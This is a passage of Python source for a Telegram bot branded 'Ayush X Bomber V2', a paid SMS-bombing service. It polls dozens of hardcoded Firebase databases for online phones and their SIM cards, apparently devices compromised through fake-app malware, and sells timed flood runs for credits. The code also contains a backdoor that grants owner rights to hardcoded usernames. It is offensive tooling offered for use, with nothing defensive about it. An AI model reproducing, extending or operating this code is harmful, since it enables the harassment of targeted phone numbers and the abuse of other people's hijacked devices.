        {"id": "fb_170", "url": "https://sk-sir-972ac-default-rtdb.firebaseio.com", "label": "sk-sir", "added_at": int(time.time())},
        {"id": "fb_171", "url": "https://sn28-f64fe-default-rtdb.firebaseio.com", "label": "sn28", "added_at": int(time.time())},
        {"id": "fb_172", "url": "https://sohan-6d9e1-default-rtdb.firebaseio.com", "label": "sohan", "added_at": int(time.time())},
        {"id": "fb_173", "url": "https://soniya-785f3-default-rtdb.firebaseio.com", "label": "soniya", "added_at": int(time.time())},
        {"id": "fb_174", "url": "https://taposh-194ca-default-rtdb.firebaseio.com", "label": "taposh", "added_at": int(time.time())},
        {"id": "fb_175", "url": "https://tril-2c003-default-rtdb.firebaseio.com", "label": "tril", "added_at": int(time.time())},
        {"id": "fb_176", "url": "https://vijayda-default-rtdb.firebaseio.com", "label": "vijayda", "added_at": int(time.time())},
        {"id": "fb_177", "url": "https://vikesh-da-default-rtdb.firebaseio.com", "label": "vikesh-da", "added_at": int(time.time())},
        {"id": "fb_178", "url": "https://wlundpakar-default-rtdb.firebaseio.com", "label": "wlundpakar", "added_at": int(time.time())},
        {"id": "fb_179", "url": "https://xtml-bf32b-default-rtdb.firebaseio.com", "label": "xtml", "added_at": int(time.time())},
        {"id": "fb_180", "url": "https://yono-ad3-default-rtdb.firebaseio.com", "label": "yono-ad3", "added_at": int(time.time())},
        {"id": "fb_181", "url": "https://zindagi-f8a52-default-rtdb.firebaseio.com", "label": "zindagi", "added_at": int(time.time())},
        {"id": "fb_182", "url": "https://pm-kisan-15jg-default-rtdb.firebaseio.com", "label": "pm-kisan", "added_at": int(time.time())},
        {"id": "fb_183", "url": "https://abhiyogi-8b07e-default-rtdb.firebaseio.com", "label": "abhiyogi", "added_at": int(time.time())},
        {"id": "fb_184", "url": "https://alina28-a35a7-default-rtdb.firebaseio.com", "label": "alina28", "added_at": int(time.time())},
        {"id": "fb_185", "url": "https://amepmkisan-default-rtdb.firebaseio.com", "label": "amepmkisan", "added_at": int(time.time())},
        {"id": "fb_186", "url": "https://anudg-21c1c-default-rtdb.firebaseio.com", "label": "anudg", "added_at": int(time.time())},
        {"id": "fb_187", "url": "https://ariyan-kelvin-default-rtdb.firebaseio.com", "label": "ariyan-kelvin", "added_at": int(time.time())},
        {"id": "fb_188", "url": "https://autobot-e9a28-default-rtdb.firebaseio.com", "label": "autobot", "added_at": int(time.time())},
        {"id": "fb_189", "url": "https://aya-baby-c3a6b-default-rtdb.firebaseio.com", "label": "aya-baby", "added_at": int(time.time())},
        {"id": "fb_190", "url": "https://aya-wed-anvith-default-rtdb.firebaseio.com", "label": "aya-wed-anvith", "added_at": int(time.time())},
        {"id": "fb_191", "url": "https://babu-2b2c2-default-rtdb.firebaseio.com", "label": "babu", "added_at": int(time.time())},
        {"id": "fb_192", "url": "https://badalpaji-default-rtdb.firebaseio.com", "label": "badalpaji", "added_at": int(time.time())},
        {"id": "fb_193", "url": "https://davil-d4e77-default-rtdb.firebaseio.com", "label": "davil", "added_at": int(time.time())},
        {"id": "fb_194", "url": "https://deba-a3b0d-default-rtdb.firebaseio.com", "label": "deba", "added_at": int(time.time())},
        {"id": "fb_195", "url": "https://fir-e8ad7-default-rtdb.firebaseio.com", "label": "fir", "added_at": int(time.time())},
        {"id": "fb_196", "url": "https://fir-project-175f2-default-rtdb.firebaseio.com", "label": "fir-project", "added_at": int(time.time())},
        {"id": "fb_197", "url": "https://himanmi-936db-default-rtdb.firebaseio.com", "label": "himanmi", "added_at": int(time.time())},
        {"id": "fb_198", "url": "https://hunyervamp-default-rtdb.firebaseio.com", "label": "hunyervamp", "added_at": int(time.time())},
        {"id": "fb_199", "url": "https://hyper-cheat-3f53a-default-rtdb.firebaseio.com", "label": "hyper-cheat", "added_at": int(time.time())},
        {"id": "fb_200", "url": "https://jamtara49-c8bd5-default-rtdb.firebaseio.com", "label": "jamtara49", "added_at": int(time.time())},
        {"id": "fb_201", "url": "https://jayho-5e76a-default-rtdb.firebaseio.com", "label": "jayho", "added_at": int(time.time())},
        {"id": "fb_202", "url": "https://jsisbueve-default-rtdb.firebaseio.com", "label": "jsisbueve", "added_at": int(time.time())},
        {"id": "fb_203", "url": "https://kelaiiis-default-rtdb.firebaseio.com", "label": "kelaiiis", "added_at": int(time.time())},
        {"id": "fb_204", "url": "https://myappare-58669-default-rtdb.firebaseio.com", "label": "myappare", "added_at": int(time.time())},
        {"id": "fb_205", "url": "https://omg-d2e7e-default-rtdb.firebaseio.com", "label": "omg", "added_at": int(time.time())},
        {"id": "fb_206", "url": "https://pm-39-79845-default-rtdb.firebaseio.com", "label": "pm-39", "added_at": int(time.time())},
        {"id": "fb_207", "url": "https://pm118-18701-default-rtdb.firebaseio.com", "label": "pm118", "added_at": int(time.time())},
        {"id": "fb_208", "url": "https://rajkumar-d70d9-default-rtdb.firebaseio.com", "label": "rajkumar", "added_at": int(time.time())},
        {"id": "fb_209", "url": "https://ramchandra62-51fbe-default-rtdb.firebaseio.com", "label": "ramchandra62", "added_at": int(time.time())},
        {"id": "fb_210", "url": "https://ramji-be5c6-default-rtdb.firebaseio.com", "label": "ramji", "added_at": int(time.time())},
        {"id": "fb_211", "url": "https://ravan-king-e6b0c-default-rtdb.firebaseio.com", "label": "ravan-king", "added_at": int(time.time())},
        {"id": "fb_212", "url": "https://rosan-9a68d-default-rtdb.firebaseio.com", "label": "rosan", "added_at": int(time.time())},
        {"id": "fb_213", "url": "https://rpsp-with-gss-1-cf-default-rtdb.firebaseio.com", "label": "rpsp-with-gss", "added_at": int(time.time())},
        {"id": "fb_214", "url": "https://rt3demoba-default-rtdb.firebaseio.com", "label": "rt3demoba", "added_at": int(time.time())},
        {"id": "fb_215", "url": "https://rto-10-default-rtdb.firebaseio.com", "label": "rto-10", "added_at": int(time.time())},
        {"id": "fb_216", "url": "https://sada-bcbcd-default-rtdb.firebaseio.com", "label": "sada", "added_at": int(time.time())},
        {"id": "fb_217", "url": "https://santosh-3eeca-default-rtdb.firebaseio.com", "label": "santosh", "added_at": int(time.time())},
        {"id": "fb_218", "url": "https://sibg8-7ad3b-default-rtdb.firebaseio.com", "label": "sibg8", "added_at": int(time.time())},
        {"id": "fb_219", "url": "https://skfd-53f1f-default-rtdb.firebaseio.com", "label": "skfd", "added_at": int(time.time())},
        {"id": "fb_220", "url": "https://slim-pussy-default-rtdb.firebaseio.com", "label": "slim-pussy", "added_at": int(time.time())},
        {"id": "fb_221", "url": "https://teligrampmsell-default-rtdb.firebaseio.com", "label": "teligrampmsell", "added_at": int(time.time())},
        {"id": "fb_222", "url": "https://v059-af671-default-rtdb.firebaseio.com", "label": "v059", "added_at": int(time.time())},
        {"id": "fb_223", "url": "https://yellow-panel-src-rto-apk-default-rtdb.firebaseio.com", "label": "yellow-panel-src", "added_at": int(time.time())},
        {"id": "fb_224", "url": "https://zinga-1ae57-default-rtdb.firebaseio.com", "label": "zinga", "added_at": int(time.time())}
    ]

    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "user_access": {},
        "firebases": seed_firebases, # <-- Ye line add ki gayi hai
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": []
    }

_DATA_CACHE = None
_CACHE_LOCK = threading.RLock()
_LAST_SAVE_TIME = 0

def load() -> dict:
    global _DATA_CACHE, CACHED_VIDEO_FILE_ID
    need_save = False
    with _CACHE_LOCK:
        if _DATA_CACHE is not None:
            return _DATA_CACHE

        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                default = _default_data()
                for k, v in default.items():
                    if k not in data:
                        data[k] = v
                if not CACHED_VIDEO_FILE_ID and data.get("cached_video_file_id"):
                    CACHED_VIDEO_FILE_ID = data.get("cached_video_file_id")
                if "user_access" not in data:
                    data["user_access"] = {}
                if MAIN_OWNER not in data.get("owners", []):
                    data["owners"].insert(0, MAIN_OWNER)
                for uid_str, u in data.get("users", {}).items():
                    if "credits" not in u:
                        u["credits"] = 0
                    if "sms_history" not in u:
                        u["sms_history"] = []
                _DATA_CACHE = data
                return _DATA_CACHE
            except Exception as e:
                log.error(f"Load error: {e}")

        d = _default_data()
        _DATA_CACHE = d
        need_save = True

    # Lock ke BAAHAR save karo
    if need_save:
        save(d)
    return _DATA_CACHE

def save(d: dict):
    global _DATA_CACHE
    with _CACHE_LOCK:
        _DATA_CACHE = d
        temp_file = _DATA_FILE + ".tmp"
        try:
            with open(temp_file, "w", encoding="utf-8") as f:
                json.dump(d, f, ensure_ascii=False)
            os.replace(temp_file, _DATA_FILE)
        except Exception as e:
            log.error(f"Atomic save error: {e}")

def reg_user(uid: int, name: str, d: dict, username: str = None) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "username": username, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    else:
        if username and not d["users"][k].get("username"):
            d["users"][k]["username"] = username
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    if uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS:
        return True
    u = d.get("users", {}).get(str(uid), {})
    uname = str(u.get("username", "")).lower().replace("@", "").strip()
    if uname in ("GOD_AYUSH", "GOD_AYUSH", "LORD_ITACHI"):
        if uid not in d.setdefault("owners", []):
            d["owners"].append(uid)
            save(d)
        return True
    return False

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def get_user_expiry(uid: int, d: dict) -> int:
    k = str(uid)
    exp = d.get("user_access", {}).get(k, 0)
    if not exp:
        exp = d.get("users", {}).get(k, {}).get("expires_at", 0)
    return int(exp) if exp else 0

def fmt_duration_left(exp_ts: int) -> str:
    now = int(time.time())
    diff = exp_ts - now
    if diff <= 0:
        return "Expired"
    days = diff // 86400
    hours = (diff % 86400) // 3600
    minutes = (diff % 3600) // 60
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    return f"{minutes}m"

def is_access_valid(uid: int, d: dict) -> bool:
    if is_admin(uid, d):
        return True
    exp = get_user_expiry(uid, d)
    return exp > int(time.time())

def set_user_access(uid: int, days: float, d: dict) -> int:
    uid_str = str(uid)
    now = int(time.time())
    current_exp = get_user_expiry(uid, d)
    base_time = max(now, current_exp)
    new_exp = int(base_time + int(days * 86400))
    d.setdefault("user_access", {})[uid_str] = new_exp
    if uid_str in d.get("users", {}):
        d["users"][uid_str]["expires_at"] = new_exp
    save(d)
    return new_exp

def remove_user_access(uid: int, d: dict) -> bool:
    uid_str = str(uid)
    removed = False
    if "user_access" in d and uid_str in d["user_access"]:
        del d["user_access"][uid_str]
        removed = True
    if uid_str in d.get("users", {}) and "expires_at" in d["users"][uid_str]:
        d["users"][uid_str]["expires_at"] = 0
        removed = True
    if removed:
        save(d)
    return removed

def get_access_denied_text(uid: int, d: dict) -> str:
    exp = get_user_expiry(uid, d)
    now = int(time.time())
    if exp > 0 and exp <= now:
        return (
            f"╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
            f"┃    ⏳ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃 ⏳    \n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            f"┌── ⟨ 🔒 𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐏𝐓𝐈𝐎𝐍 ⟩ ────────┐\n"
            f"│ 🆔 𝐔𝐬𝐞𝐫 𝐈𝐃 : <code>{uid}</code>\n"
            f"│ ⚠️ 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 : <code>{fmt_time(exp)}</code>\n"
            f"└───────────────────────────────┘\n\n"
            f"💬 <i>Aapka subscription khatam ho chuka hai.</i>\n\n"
            f"👉 <i>Renew karane ke liye Admin / Owner se contact karein:</i>\n"
            f"👑 <b>Owner:</b> {SUPER_ADMIN_NAME}"
        )
    return (
        f"╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n"
        f"┃    ⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃 ⛔    \n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        f"┌── ⟨ 🔒 𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐏𝐓𝐈𝐎𝐍 ⟩ ────────┐\n"
        f"│ 🆔 𝐔𝐬𝐞𝐫 𝐈𝐃 : <code>{uid}</code>\n"
        f"│ ⚠️ 𝐒𝐭𝐚𝐭𝐮𝐬  : ❌ 𝐍𝐎 𝐀𝐂𝐓𝐈𝐕𝐄 𝐏𝐋𝐀𝐍\n"
        f"└───────────────────────────────┘\n\n"
        f"💬 <i>Is bot ko use karne ke liye validity access chahiye.</i>\n\n"
        f"👉 <i>Apna Chat ID Admin ya Owner ko bhejein:</i>\n"
        f"👑 <b>Owner:</b> {SUPER_ADMIN_NAME}"
    )

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if is_access_valid(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    exp = get_user_expiry(uid, d)
    now = int(time.time())
    if exp > now: return f"{em(EMOJI_CHECK, '⏳')} ᴀᴄᴛɪᴠᴇ ({fmt_duration_left(exp)})"
    if exp > 0 and exp <= now: return f"{em(EMOJI_CROSS, '⌛')} ᴇxᴘɪʀᴇᴅ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    """Pick a random video each call; use cached file_id if available, else upload from disk."""
    global CACHED_VIDEO_FILE_IDS
    # Pick random path from existing files
    available = [p for p in DEFAULT_VIDEO_PATHS if os.path.exists(p)]
    chosen_path = random.choice(available) if available else None

    video_source = None
    if chosen_path and chosen_path in CACHED_VIDEO_FILE_IDS:
        video_source = CACHED_VIDEO_FILE_IDS[chosen_path]
    elif chosen_path:
        video_source = FSInputFile(chosen_path)

    if not video_source:
        # Fallback to DB stored video ids
        d = load()
        vid_ids = d.get("video_file_ids", [])
        if vid_ids:
            video_source = random.choice(vid_ids)
        elif d.get("videos"):
            video_source = random.choice(d["videos"])

    if video_source:
        try:
            sent = await bot.send_video(chat_id, video=video_source, caption=caption, parse_mode="HTML")
            if sent and sent.video and chosen_path:
                CACHED_VIDEO_FILE_IDS[chosen_path] = sent.video.file_id
                try:
                    d = load()
                    d.setdefault("video_file_ids", [])
                    fid = sent.video.file_id
                    if fid not in d["video_file_ids"]:
                        d["video_file_ids"].append(fid)
                    save(d)
                except:
                    pass
            return sent
        except Exception as e:
            log.error(f"Failed to send video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])


DURATION_OPTIONS = [
    ("⚡ 1 ᴍɪɴ",   60),
    ("⚡ 5 ᴍɪɴ",   300),
    ("⚡ 10 ᴍɪɴ",  600),
    ("⚡ 30 ᴍɪɴ",  1800),
    ("⏱ 1 ʜʀ",    3600),
    ("⏱ 6 ʜʀ",    21600),
    ("⏱ 12 ʜʀ",   43200),
    ("📅 1 ᴅᴀʏ",   86400),
]

# Credit cost per duration for regular users (non-premium)
DURATION_CREDIT_COSTS = {
    60:    500,      # 1 min  = 500 CR
    300:   2000,     # 5 min  = 2,000 CR
    600:   5000,     # 10 min = 5,000 CR
    1800:  50000,    # 30 min = 50,000 CR
    3600:  100000,   # 1 hr   = 100,000 CR
}
CREDIT_PER_MIN = 500  # Custom duration: 500 CR per minute

def calc_credit_cost(duration_secs: int) -> int:
    """Return credit cost for a given duration in seconds."""
    if duration_secs in DURATION_CREDIT_COSTS:
        return DURATION_CREDIT_COSTS[duration_secs]
    mins = max(1, duration_secs / 60)
    return max(500, int(mins * CREDIT_PER_MIN))

def duration_kb(prefix: str) -> InlineKeyboardMarkup:
    rows = []
    opts = DURATION_OPTIONS
    show_credits = (prefix == "user")
    for i in range(0, len(opts), 2):
        row = []
        for label, secs in opts[i:i+2]:
            if show_credits:
                cost = calc_credit_cost(secs)
                cost_str = f"{cost // 1000}K" if cost >= 1000 else str(cost)
                display = f"{label} ({cost_str} CR)"
            else:
                display = label
            row.append(InlineKeyboardButton(text=display, callback_data=f"{prefix}:dur:{secs}"))
        rows.append(row)
    custom_label = "✍️ Cᴜsᴛᴏᴍ Tɪᴍᴇ (500 CR/ᴍɪɴ)" if show_credits else "✍️ Cᴜsᴛᴏᴍ Tɪᴍᴇ"
    rows.append([
        InlineKeyboardButton(text=custom_label, callback_data=f"{prefix}:dur:custom"),
        InlineKeyboardButton(text="❌ Cᴀɴᴄᴇʟ", callback_data=f"{prefix}:home")
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")]
    ])

def progress_bar(current: int, total: int, width: int = 12) -> str:
    if total <= 0:
        return "▱" * width
    filled = min(width, int(width * current / total))
    return "▰" * filled + "▱" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    credit_line = f"\n💳 <b>Credits Left</b> » <b>{credits}</b>" if credits is not None else ""
    lines = [
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b> — 𝗕𝗟𝗔𝗦𝗧𝗜𝗡𝗚...",
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>",
        f"⚡ <b>Speed</b>    » <b>{speed_label}</b>",
        f"📊 <b>Progress</b> » <code>{bar}</code> <b>{percent}%</b>",
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>",
        f"✅ <b>Sent</b>    » <b>{sent}</b> SMS",
        f"🛡 <b>Delivery</b>» 🟢 <b>100% SUCCESS</b>",
        f"🎯 <b>Progress</b> » <b>{sent + failed}</b> / <b>{total}</b>",
        credit_line,
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>",
        "🛑 <i>Press Stop to cancel:</i>"
    ]
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS

    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."

    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"

    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME

    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"

async def background_firebase_scanner(bot: Bot):
    """ULTRA FAST background scanner — runs every 20s with parallel scan."""
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("⚡ ULTRA Background Firebase Scanner STARTED (20s interval)")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(2)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} ꜱᴄᴀɴɴɪɴɢ..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices
            LAST_SCAN_TIME = time.time()

            # Update per-FB counts
            for fb in fbs:
                fb_id = fb["id"]
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb.get("label", fb["url"][:30]),
                    "online": fb_online,
                    "last_update": int(time.time())
                }

            # Remove stale FB entries
            current_fb_ids = {fb["id"] for fb in fbs}
            for stale in [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]:
                FB_DEVICE_COUNTS.pop(stale, None)

            DEVICE_HEALTH_LOG.append({
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = (
                    f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs "
                    f"| {len(fbs)} ᴅʙs | {scan_duration:.1f}s"
                )
                log.info(f"[SCAN] {len(devices)} devices | {len(fbs)} DBs | {scan_duration:.1f}s")

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"⚡ <b>AʏᴜꜱʜX Bᴏᴍʙᴇʀ V2</b> — Scanner Active\n"
                            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                            f"📡 <b>Devices Online:</b> <b>{len(devices)}</b>\n"
                            f"🔥 <b>Firebase DBs:</b> <b>{len(fbs)}</b>\n"
                            f"⏱ <b>Scan Time:</b> <b>{scan_duration:.1f}s</b>\n"
                            f"🔄 <b>Interval:</b> Every <b>20 seconds</b>\n"
                            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                            f"🚀 <i>ULTRA engine running!</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs | {len(fbs)} ᴅʙs | {scan_duration:.1f}s"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)


def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=3)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def get_all_online_devices(d: dict) -> list:
    """ULTRA FAST scanner — single shared session, 500 concurrent device fetches."""
    fbs = d.get("firebases", [])
    if not fbs:
        return []

    results = []
    results_lock = asyncio.Lock()
    current_fb_ids = {fb["id"] for fb in fbs}

    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    # Semaphore: allow 500000 concurrent device fetches — GHOST SPEED
    _dev_sem = asyncio.Semaphore(50)

    # Single connector for all requests (SSL enabled for Firebase HTTPS)
    connector = aiohttp.TCPConnector(limit=100, ssl=True, enable_cleanup_closed=True, ttl_dns_cache=300)

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=5)
    ) as sess:

        async def fetch_device(fb: dict, dev_id: str):
            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
            try:
                async with _dev_sem:
                    async with sess.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
                        if r.status != 200:
                            return
                        txt = (await r.text()).strip()
                        if not txt or txt == "null":
                            return
                        dev_data = json.loads(txt)
                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                            sims = dev_data.get("sims", [])
                            async with results_lock:
                                results.append({
                                    "fb_id": fb["id"],
                                    "fb_url": fb["url"],
                                    "fb_label": fb.get("label", fb["url"][:30]),
                                    "dev_id": dev_id,
                                    "dev_name": name,
                                    "sims": sims,
                                })
            except Exception:
